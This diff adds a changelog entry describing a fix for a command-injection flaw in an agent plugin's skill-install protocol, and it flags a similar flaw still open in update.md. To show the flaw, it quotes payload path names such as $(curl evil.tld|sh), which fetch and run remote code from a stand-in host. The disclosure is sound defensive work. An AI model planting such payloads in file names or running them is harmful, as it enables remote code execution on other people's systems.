@@ -6,6 +6,18 @@ Entries are reverse-chronological (newest first) and reference the merging PR + 
 
 ---
 
+## v0.51.4
+
+Close the CWE-78 command-injection gap in `install-protocol.md`'s Step 9a vendor-install fetch — closes #380.
+
+- **Gap closed** — `install-protocol.md` Step 9a (the primary, always-reached vendor path in the `/ievo:init` pipeline) instructed the installing agent to fetch a candidate skill/agent's SKILL.md + `scripts/`/`references/`/`assets/` via a `gh api` content-fetch built from the candidate's own repo/tree data. A git tree entry's path can legally contain shell metacharacters (only NUL is forbidden), so a malicious candidate could name a file or directory under those paths something like `` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`; the shell resolves that command substitution before the intended `gh api` call runs, and double-quoting does not suppress it. `init/SKILL.md`'s own Step 9 one-line summary echoed the identical unfixed pattern, confirming this was the live path, not a stale branch. Same CWE-78 class as the already-fixed `security-check/SKILL.md` (#347) and `evo/SKILL.md` (#355).
+- **Fix** — rewrote install-protocol.md Step 9a's skill-fetch sub-step (and the "Agent" variant, which explicitly inherited "same as skill") to the clone-once + Glob + Read/Write protocol already used by the two sibling fixes: validate `<owner>`/`<repo>` against GitHub's slug charset, resolve and validate the default branch against a ref allowlist before resolving a commit SHA (validated against `^[0-9a-f]{7,40}$`), shallow-clone into a fresh `mktemp -d`, then fetch — Glob-enumerate + Read/Write for a skill's directory tree, or a direct Read/Write for an agent's single `.md` file (an `/ievo:deep-review` pass caught that Glob-enumerating a single-file path silently returns nothing, so the agent case needed its own sub-step rather than reusing the skill's Glob-based one) — never building a Bash/`gh api` command line from an untrusted path. Updated `init/SKILL.md`'s Step 9 summary to describe the new fetch mechanism instead of the raw `gh api` fetch.
+- **Scope note** — the same `/ievo:deep-review` pass flagged that the identical CWE-78 `gh api repos/<source.repo>/contents/<source.path>` pattern this PR closes for install also remains live in `plugins/ievo/commands/update.md` Step 2, which fetches an update using the same untrusted `source.repo`/`source.path` overlay metadata that install-protocol.md's fix writes. That's a distinct call site from #380's install-path finding — left out of scope for this PR (issue #380 scoped the fix to install-protocol.md + init/SKILL.md, mirroring the #347/#355 precedent), flagged here for a follow-up rather than silently dropped.
+- **Scope** — confined to `plugins/ievo/skills/init/references/install-protocol.md` and the one-line fetch description in `plugins/ievo/skills/init/SKILL.md` Step 9. No script changes; no test suite applies (this module ships prose protocol, not executable code).
+- **Version** — bump per AGENTS.md rules (`fix:` → patch); `discover.mjs` and `evolution_candidates.mjs` `SCRIPT_VERSION`, `plugin.json`, `marketplace.json`, and the AGENTS.md compliance ledger updated in lockstep. `scan_repo.mjs`'s own `SCRIPT_VERSION` (scanner output-format version, intentionally decoupled from `plugin.json`) is unchanged — no scanner output-format change here.
+
+---
+
 ## v0.51.3
 
 Guard `scan_repo.mjs`'s 4 `readFileSync` call sites against a memory-exhaustion DoS from an oversized attacker-controlled file — closes #374.
